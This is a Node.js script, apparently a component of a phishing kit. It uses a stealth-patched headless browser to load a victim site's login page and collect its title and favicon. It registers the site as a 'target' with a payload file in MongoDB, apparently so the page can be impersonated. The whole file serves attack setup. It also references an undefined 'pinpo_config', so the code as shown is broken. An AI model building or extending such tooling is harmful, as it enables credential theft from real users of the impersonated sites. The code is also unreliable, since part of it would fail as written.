import puppeteer from 'puppeteer-extra'
import ZtelerthPlugin from 'puppeteer-extra-plugin-stealth'
import mongoose from 'mongoose'
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Import Target model
import { Target } from './models/Target.js'

const default_user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36";

// Use user_data directory for persistent storage
const user_data_dir = path.join(__dirname, 'user_data');
const targets_file = path.join(user_data_dir, 'targets.json');
const favicons_dir = path.join(user_data_dir, 'favicons');

// Create directories if they don't exist
try {
  fs.mkdirSync(user_data_dir, { recursive: true });
  fs.mkdirSync(favicons_dir, { recursive: true });
} catch (err) {
  console.error(`Error creating directories: ${err.message}`);
}

var captured_favicon = false;
var desperate = false;
var super_desperate = false;
var favicon_url = '';

(async () => {
  // MongoDB connection
  const mongoUrl = process.env.MONGO_URL || 'mongodb://mongodb:27017/fescarcuddle';
  
  try {
    await mongoose.connect(mongoUrl, {
      useNewUrlParser: true,
      useUnifiedTopology: true
    });
    console.log('[ADD_TARGET] MongoDB connected');
  } catch (err) {
    console.error('[ADD_TARGET] ERROR: Could not connect to MongoDB:', err.message);
    process.exit(1);
  }

  // Get parameters from command line
  const login_page = process.argv[2];
  const language = process.argv[3] || 'es-419,es;q=0.9,en;q=0.8';

  // Validate URL parameter
  if (!login_page) {
    console.error('Usage: node add_target.js <url> [language]');
    console.error('Example: node add_target.js "https://example.com/login" "es-419,es;q=0.9,en;q=0.8"');
    mongoose.disconnect();
    process.exit(1);
  }

  let puppet_options = [
    "--ignore-certificate-errors",
    "--disable-blink-features=AutomationControlled",
    "--start-maximized",
    "--no-sandbox",
  ]

  if (pinpo_config.proxy !== undefined) {
    puppet_options.push("--proxy-server=" + pinpo_config.proxy)
  }

  const language_header = (language && language.trim()) ? language.trim() : 'es-419,es;q=0.9,en;q=0.8'
  const primary_language = language_header.split(',')[0].trim()
  if (primary_language) {
    puppet_options.push(`--lang=${primary_language}`)
  }

  console.log(`Adding target: ${login_page}`);
  console.log(`Language: ${language_header}`);

  const browser = await puppeteer.launch({
    headless: "new",
    ignoreHTTPSErrors: true,
    ignoreDefaultArgs: ["--enable-automation"],
    defaultViewport: null,
    args: puppet_options
  });

  const page = await browser.newPage();
  await page.setUserAgent(default_user_agent)
  await page.setCacheEnabled(false);
  await page.setExtraHTTPHeaders({ 'Accept-Language': language_header })
  await page.evaluateOnNewDocument((lang) => {
    try {
      Object.defineProperty(navigator, 'language', { get: () => lang })
      Object.defineProperty(navigator, 'languages', { get: () => [lang, lang.split('-')[0]] })
    } catch (err) {
      // Ignore when browser prevents overriding navigator properties.
    }
  }, primary_language)

  const short_name = login_page.split("/")[2].split('.').slice(-2, -1)[0]

  page.on('response', async response => {
    let mime_type = response.headers()['content-type']
    if (mime_type === 'image/x-icon' || mime_type === 'image/vnd.microsoft.icon' || (desperate && /image/.test(mime_type)) || super_desperate) {
      captured_favicon = true
      console.log(`Collected Favicon From: ${response.url()}`)
      response.buffer().then(file => {
        const fileName = `${short_name}.ico`;
        const filePath = path.join(favicons_dir, fileName);
        const writeStream = fs.createWriteStream(filePath);
        writeStream.write(file);
        console.log(`[ADD_TARGET] Saved favicon to ${filePath}`);
      }).catch(err => {
        console.log(`Error saving favicon: ${err.message}`);
      });
    }
  });

  let final_url = login_page;
  let page_loaded = false;

  try {
    await page.goto(login_page, {
      waitUntil: ['load', 'domcontentloaded', 'networkidle2']
    });

    // Get the final URL after any redirects
    final_url = page.url();
    console.log(`Final URL after redirects: ${final_url}`);
    page_loaded = true;

  } catch (err) {
    console.log("Error loading URL:", err.message);
  }

  let title = '';
  if (page_loaded) {
    try {
      // Wait a bit more to ensure page is fully ready
      await page.waitForFunction('document.readyState === "complete"', { timeout: 5000 }).catch(() => { });
      title = await page.evaluate('document.title');
      console.log(`Target Tab Title: ${title}`)
    } catch (err) {
      console.log("Error getting page title:", err.message);
      title = '';
    }
  }

  if (!captured_favicon && page_loaded) {
    console.log(`Failed to Passively Collect Favicon... Attempting to Manually Extract`)
    try {
      favicon_url = await page.evaluate('const iconElement = document.querySelector("link[rel~=icon]");const href = (iconElement && iconElement.href) || "/favicon.ico";const faviconURL = new URL(href, window.location).toString();faviconURL;');
      desperate = true
      await page.goto(favicon_url, {
        waitUntil: ['load', 'domcontentloaded', 'networkidle2']
      })
    } catch (err) {
      console.log("Error loading favicon URL:", err.message);
    }
  }

  if (!captured_favicon && favicon_url) {
    console.log(`Failed to Actively Collect Favicon... Attempting One Last Try`)
    super_desperate = true
    try {
      await page.goto(favicon_url, {
        waitUntil: ['load', 'domcontentloaded', 'networkidle2']
      })
    } catch (err) {
      console.log("Error on final favicon attempt:", err.message);
    }
  }

  if (!captured_favicon) {
    console.log(`Failed to Actively Collect Favicon... Try Downloading it Yourself and Name it ./user_data/favicons/${short_name}.ico`)
  }

  // Save target to MongoDB
  try {
    const target_data = {
      name: short_name,
      login_page: login_page,
      boot_location: final_url,
      tab_title: title,
      favicon: `${short_name}.ico`,
      language: language_header,
      payload: `payload.txt`,
    };

    // Try to update if exists, otherwise create new
    const saved_target = await Target.findOneAndUpdate(
      { name: short_name },
      target_data,
      { upsert: true, new: true }
    );

    console.log(`[ADD_TARGET] Saved target '${short_name}' to MongoDB`);
    console.log(`[ADD_TARGET] Target details:`, saved_target);
  } catch (err) {
    console.error(`[ADD_TARGET] ERROR saving target to MongoDB:`, err.message);
    await browser.close();
    mongoose.disconnect();
    process.exit(1);
  }

  await browser.close();
  await mongoose.disconnect();
  console.log('[ADD_TARGET] Done');
})();

